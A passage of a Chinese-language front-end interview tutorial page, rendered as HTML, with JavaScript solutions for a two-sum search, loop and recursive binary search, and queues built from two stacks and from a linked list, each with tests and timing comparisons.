        <span class="token keyword">break</span> <span class="token comment">// 调出循环</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 调出循环</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token keyword">break</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">return</span> res
<span class="token punctuation">}</span>
</code></pre></div><p><strong>查找和为 n 的两个数（双指针）</strong></p> <blockquote><p>随便找两个数，如果和大于<code>n</code>的话，则需要向前寻找，如果小于<code>n</code>的话，则需要向后寻找 -- <code>二分的思想</code></p></blockquote> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">/**
 * 查找和为 n 的两个数（双指针）
 * @param arr arr:number[]
 * @param n n:number
 */</span>
<span class="token keyword">function</span> <span class="token function">findTowNumbers2</span><span class="token punctuation">(</span><span class="token parameter">arr<span class="token punctuation">,</span> n</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

  <span class="token keyword">const</span> length <span class="token operator">=</span> arr<span class="token punctuation">.</span>length
  <span class="token keyword">if</span> <span class="token punctuation">(</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> res

  <span class="token comment">// ![](https://s.poetries.work/uploads/2023/01/28cd379998c81e43.png)</span>
  <span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span> <span class="token comment">// 定义i指向头</span>
  <span class="token keyword">let</span> j <span class="token operator">=</span> length <span class="token operator">-</span> <span class="token number">1</span> <span class="token comment">// 定义j指向尾</span>
  <span class="token comment">// 求arr[i] + arr[j]的和，如果大于n，则j向前移动j--，如果小于n，则i向后移动i++</span>

  <span class="token comment">// 时间复杂度 O(n)</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> j<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> n1 <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
    <span class="token keyword">const</span> n2 <span class="token operator">=</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span>
    <span class="token keyword">const</span> sum <span class="token operator">=</span> n1 <span class="token operator">+</span> n2

    <span class="token keyword">if</span> <span class="token punctuation">(</span>sum <span class="token operator">&gt;</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">//sum 大于 n ，则 j 要向前移动</span>
      j<span class="token operator">--</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>sum <span class="token operator">&lt;</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// sum 小于 n ，则 i 要向后移动</span>
      i<span class="token operator">++</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      <span class="token comment">// 相等</span>
      res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>n1<span class="token punctuation">)</span>
      res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>n2<span class="token punctuation">)</span>
      <span class="token keyword">break</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">return</span> res
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 功能测试</span>
<span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">]</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token function">findTowNumbers2</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 性能测试</span>

<span class="token comment">// 寻找和为 n 的两个数（嵌套循环）</span>
console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">'findTowNumbers1'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span> <span class="token operator">*</span> <span class="token number">10000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">findTowNumbers1</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
console<span class="token punctuation">.</span><span class="token function">timeEnd</span><span class="token punctuation">(</span><span class="token string">'findTowNumbers1'</span><span class="token punctuation">)</span> <span class="token comment">// 730ms</span>

<span class="token comment">// 查找和为 n 的两个数（双指针）</span>
console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">'findTowNumbers2'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span> <span class="token operator">*</span> <span class="token number">10000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">findTowNumbers2</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
console<span class="token punctuation">.</span><span class="token function">timeEnd</span><span class="token punctuation">(</span><span class="token string">'findTowNumbers2'</span><span class="token punctuation">)</span> <span class="token comment">// 102ms</span>

<span class="token comment">// 结论：双指针性能优于嵌套循环方式</span>
</code></pre></div><h3 id="实现二分查找并分析时间复杂度"><a href="#实现二分查找并分析时间复杂度" class="header-anchor">#</a> 实现二分查找并分析时间复杂度</h3> <p><strong>思路分析</strong></p> <p>二分查找，每次都取<code>1/2</code>，缩小范围，直到找到那个数为止</p> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/01/1ffdb03bf7e1a9e9.png" loading="lazy" class="lazy"></p> <ul><li>递归，代码逻辑更加清晰</li> <li>非递归，性能更好</li> <li>二分查找时间复杂度 <code>O(logn)</code> 非常快</li></ul> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/01/cbcae41ac652112f.png" loading="lazy" class="lazy"></p> <p><strong>总结</strong></p> <ul><li>只要是可排序的，都可以用二分查找</li> <li>只要用二分的思想，时间复杂度必包含<code>O(logn)</code></li></ul> <p><strong>二分查找（循环）</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">/**
 * 二分查找（循环）
 * @param arr arr:number[]
 * @param target target:number 查找的目标值的索引
 */</span>
<span class="token keyword">function</span> <span class="token function">binarySearch1</span><span class="token punctuation">(</span><span class="token parameter">arr<span class="token punctuation">,</span> target</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> length <span class="token operator">=</span> arr<span class="token punctuation">.</span>length
  <span class="token keyword">if</span> <span class="token punctuation">(</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token comment">// 找不到</span>

  <span class="token comment">// ![](https://s.poetries.work/uploads/2023/01/2f43f28ec7699c17.png)</span>
  <span class="token comment">// startIndex、endIndex当前查找区域的开始和结束</span>
  <span class="token keyword">let</span> startIndex <span class="token operator">=</span> <span class="token number">0</span> <span class="token comment">// 查找的开始位置</span>
  <span class="token keyword">let</span> endIndex <span class="token operator">=</span> length <span class="token operator">-</span> <span class="token number">1</span> <span class="token comment">// 查找的结束位置</span>

  <span class="token comment">// startIndex和endIndex还没有相交，还是有查找的范围的</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span>startIndex <span class="token operator">&lt;=</span> endIndex<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> midIndex <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token punctuation">(</span>startIndex <span class="token operator">+</span> endIndex<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span>
    <span class="token keyword">const</span> midValue <span class="token operator">=</span> arr<span class="token punctuation">[</span>midIndex<span class="token punctuation">]</span> <span class="token comment">// 获取中间值</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>target <span class="token operator">&lt;</span> midValue<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 查找的目标值小于中间值</span>
      <span class="token comment">// 目标值较小，则继续在左侧查找</span>
      endIndex <span class="token operator">=</span> midIndex <span class="token operator">-</span> <span class="token number">1</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>target <span class="token operator">&gt;</span> midValue<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 查找的目标值大于中间值</span>
      <span class="token comment">// 目标值较大，则继续在右侧查找</span>
      startIndex <span class="token operator">=</span> midIndex <span class="token operator">+</span> <span class="token number">1</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      <span class="token comment">// 相等，返回目标值的索引</span>
      <span class="token keyword">return</span> midIndex
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token comment">// startIndex和endIndex相交后还是找不到返回-1</span>
<span class="token punctuation">}</span>
</code></pre></div><p><strong>二分查找（递归）</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">/**
 * 二分查找（递归）
 * @param arr arr:number[]
 * @param target target:number 查找的目标值的索引
 * @param startIndex?:number start index 二分查找区间的开始位置
 * @param endIndex?:number end index 二分查找区间的结束位置
 */</span>
<span class="token keyword">function</span> <span class="token function">binarySearch2</span><span class="token punctuation">(</span><span class="token parameter">arr<span class="token punctuation">,</span> target<span class="token punctuation">,</span> startIndex<span class="token punctuation">,</span> endIndex</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> length <span class="token operator">=</span> arr<span class="token punctuation">.</span>length
  <span class="token keyword">if</span> <span class="token punctuation">(</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>

  <span class="token comment">// 开始和结束的范围</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>startIndex <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> startIndex <span class="token operator">=</span> <span class="token number">0</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>endIndex <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> endIndex <span class="token operator">=</span> length <span class="token operator">-</span> <span class="token number">1</span>

  <span class="token comment">// 如果 start 和 end 相遇，则结束</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>startIndex <span class="token operator">&gt;</span> endIndex<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>

  <span class="token comment">// 中间位置</span>
  <span class="token keyword">const</span> midIndex <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token punctuation">(</span>startIndex <span class="token operator">+</span> endIndex<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span>
  <span class="token keyword">const</span> midValue <span class="token operator">=</span> arr<span class="token punctuation">[</span>midIndex<span class="token punctuation">]</span> <span class="token comment">// 中间值</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>target <span class="token operator">&lt;</span> midValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 目标值较小，则继续在左侧查找 endIndex = midIndex - 1 往左移动一点</span>
    <span class="token keyword">return</span> <span class="token function">binarySearch2</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> target<span class="token punctuation">,</span> startIndex<span class="token punctuation">,</span> midIndex <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>target <span class="token operator">&gt;</span> midValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 目标值较大，则继续在右侧查找 startIndex = midIndex + 1 往右移动一点</span>
    <span class="token keyword">return</span> <span class="token function">binarySearch2</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> target<span class="token punctuation">,</span> midIndex <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> endIndex<span class="token punctuation">)</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token comment">// 相等，返回</span>
    <span class="token keyword">return</span> midIndex
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 功能测试</span>
<span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">]</span>
<span class="token keyword">const</span> target <span class="token operator">=</span> <span class="token number">40</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token function">binarySearch2</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 性能测试</span>

<span class="token comment">// 二分查找（循环）</span>
console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">'binarySearch1'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span> <span class="token operator">*</span> <span class="token number">10000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">binarySearch1</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> target<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
console<span class="token punctuation">.</span><span class="token function">timeEnd</span><span class="token punctuation">(</span><span class="token string">'binarySearch1'</span><span class="token punctuation">)</span> <span class="token comment">// 17ms</span>

<span class="token comment">// 二分查找（递归）</span>
console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">'binarySearch2'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span> <span class="token operator">*</span> <span class="token number">10000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">binarySearch2</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> target<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
console<span class="token punctuation">.</span><span class="token function">timeEnd</span><span class="token punctuation">(</span><span class="token string">'binarySearch2'</span><span class="token punctuation">)</span> <span class="token comment">// 34ms</span>

<span class="token comment">// 结论：二分查找（循环）比二分查找（递归）性能更好，递归过程多次调用函数导致性能慢一点</span>
</code></pre></div><h3 id="实现队列功能"><a href="#实现队列功能" class="header-anchor">#</a> 实现队列功能</h3> <p><strong>1. 请用两个栈，实现一个队列功能</strong></p> <blockquote><p>功能 <code>add/delete/length</code></p></blockquote> <ul><li>数组实现队列，队列特点：先进先出</li> <li>队列是逻辑结构，抽象模型，简单的可以用数组、链表来实现</li></ul> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/01/1f0b3548cfbcff91.png" loading="lazy" class="lazy"></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">/**
 * @description 两个栈实现 - 一个队列功能
 */</span>

<span class="token keyword">class</span> <span class="token class-name">MyQueue</span> <span class="token punctuation">{</span>
    stack1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    stack2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

    <span class="token comment">/**
     * 入队
     * @param n n
     */</span>
    <span class="token function">add</span><span class="token punctuation">(</span><span class="token parameter">n</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>stack1<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 出队
     */</span>
    <span class="token keyword">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">let</span> res

      <span class="token keyword">const</span> stack1 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>stack1
      <span class="token keyword">const</span> stack2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>stack2

      <span class="token comment">// 第一步：将 stack1 所有元素移动到 stack2 中</span>
      <span class="token keyword">while</span><span class="token punctuation">(</span>stack1<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token keyword">const</span> n <span class="token operator">=</span> stack1<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
              stack2<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>
          <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>

      <span class="token comment">// 第二步：stack2 pop 出栈</span>
      res <span class="token operator">=</span> stack2<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

      <span class="token comment">// 第三步：将 stack2 所有元素“还给”stack1</span>
      <span class="token keyword">while</span><span class="token punctuation">(</span>stack2<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token keyword">const</span> n <span class="token operator">=</span> stack2<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
              stack1<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>
          <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>

      <span class="token keyword">return</span> res <span class="token operator">||</span> <span class="token keyword">null</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 通过属性.length方式调用</span>
    <span class="token keyword">get</span> <span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>stack1<span class="token punctuation">.</span>length
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 功能测试</span>
<span class="token keyword">const</span> q <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyQueue</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
q<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>
q<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>
q<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>q<span class="token punctuation">.</span>length<span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>q<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>q<span class="token punctuation">.</span>length<span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>q<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>q<span class="token punctuation">.</span>length<span class="token punctuation">)</span>
</code></pre></div><blockquote><p>性能分析：时间复杂度：<code>add O(1)</code>、<code>delate O(n)</code> 空间复杂度整体是<code>O(n)</code></p></blockquote> <p><strong>2. 使用链表实现队列</strong></p> <p><strong>可能追问：链表和数组，哪个实现队列更快？</strong></p> <ul><li>数组是连续存储，<code>push</code>很快，<code>shift</code>很慢</li> <li>链表：查询慢（把链表全部遍历一遍查询）时间复杂度：<code>O(n)</code>，新增和删除快（修改指针指向）时间复杂度：<code>O(1)</code></li> <li>数组：查询快（根据下标）时间复杂度：<code>O(1)</code>，新增和删除慢（移动元素）时间复杂度：<code>O(n)</code></li> <li>结论：<code>链表实现队列更快</code></li></ul> <p><strong>思路分析</strong></p> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/01/454a91cd6ac51c43.png" loading="lazy" class="lazy"></p> <ul><li>使用单项链表，但要同时记录<code>head</code>和<code>tail</code></li> <li>要从<code>tail</code>入队，从<code>head</code>出队，否则出队时<code>tail</code>不好定位</li> <li><code>length</code>要实时记录单独存储，不可遍历链表获取<code>length</code>（否则遍历时间复杂度是<code>O(n)</code>）</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 用链表实现队列</span>

<span class="token comment">// 节点数据结构</span>
<span class="token keyword">interface</span> <span class="token class-name">IListNode</span> <span class="token punctuation">{</span>
  <span class="token literal-property property">value</span><span class="token operator">:</span> number
  <span class="token literal-property property">next</span><span class="token operator">:</span> IListNode <span class="token operator">|</span> <span class="token keyword">null</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">MyQueue</span> <span class="token punctuation">{</span>
  head <span class="token operator">=</span> <span class="token keyword">null</span> <span class="token comment">// 头节点，从head出队</span>
  tail <span class="token operator">=</span> <span class="token keyword">null</span> <span class="token comment">// 尾节点，从tail入队</span>
  len <span class="token operator">=</span> <span class="token number">0</span> <span class="token comment">// 链表长度</span>

  <span class="token comment">/**
   * 入队，在 tail 位置入队
   * @param n number
   */</span>
  <span class="token function">add</span><span class="token punctuation">(</span><span class="token parameter">n</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> newNode <span class="token operator">=</span> <span class="token punctuation">{</span>
      <span class="token literal-property property">value</span><span class="token operator">:</span> n<span class="token punctuation">,</span>
      <span class="token literal-property property">next</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 处理 head，当前队列还是空的</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>head <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>head <span class="token operator">=</span> newNode
    <span class="token punctuation">}</span>

    <span class="token comment">// 处理 tail，把tail指向新的节点</span>
    <span class="token keyword">const</span> tailNode <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>tail <span class="token comment">// 当前最后一个节点</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>tailNode<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      tailNode<span class="token punctuation">.</span>next <span class="token operator">=</span> newNode <span class="token comment">// 当前最后一个节点的next指向新的节点</span>
    <span class="token punctuation">}</span>
    <span class="token comment">// ![](https://s.poetries.work/uploads/2023/01/843c681c06e65a9c.png)</span>
    <span class="token comment">// 把当前最后一个节点断开，指向新的节点</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>tail <span class="token operator">=</span> newNode 

    <span class="token comment">// 记录长度</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>len<span class="token operator">++</span>
  <span class="token punctuation">}</span>

  <span class="token comment">/**
   * 出队，在 head 位置出队
   */</span>
  <span class="token keyword">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> headNode <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>head
    <span class="token keyword">if</span> <span class="token punctuation">(</span>headNode <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>len <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span>

    <span class="token comment">// 取值</span>
    <span class="token keyword">const</span> value <span class="token operator">=</span> headNode<span class="token punctuation">.</span>value

    <span class="token comment">// 处理 head指向下一个节点</span>
    <span class="token comment">// ![](https://s.poetries.work/uploads/2023/01/3d2d72a7370b826a.png)</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>head <span class="token operator">=</span> headNode<span class="token punctuation">.</span>next

    <span class="token comment">// 记录长度</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>len<span class="token operator">--</span>

    <span class="token keyword">return</span> value
  <span class="token punctuation">}</span>

  <span class="token keyword">get</span> <span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// length 要单独存储，不能遍历链表来获取（否则时间复杂度太高 O(n)）</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>len
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 功能测试</span>

<span class="token keyword">const</span> q <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyQueue</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
q<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>
q<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>
q<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span>

console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'length1'</span><span class="token punctuation">,</span> q<span class="token punctuation">.</span>length<span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>q<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'length2'</span><span class="token punctuation">,</span> q<span class="token punctuation">.</span>length<span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>q<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'length3'</span><span class="token punctuation">,</span> q<span class="token punctuation">.</span>length<span class="token punctuation">)</span>
